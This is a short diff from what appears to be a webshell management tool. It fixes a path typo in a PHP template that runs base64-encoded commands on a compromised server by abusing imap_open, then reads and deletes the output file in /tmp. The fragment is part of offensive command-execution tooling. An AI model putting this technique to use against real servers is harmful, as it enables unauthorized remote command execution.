@@ -928,7 +928,7 @@ imap_open('{' . $server . ':143/imap}INBOX', '', '');
 sleep(0.5);
 $o=file_get_contents("/tmp/%s");
 %s
-unlink("/tmp%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
+unlink("/tmp/%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
     elif (gget("webshell.exec_func", "webshell")):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
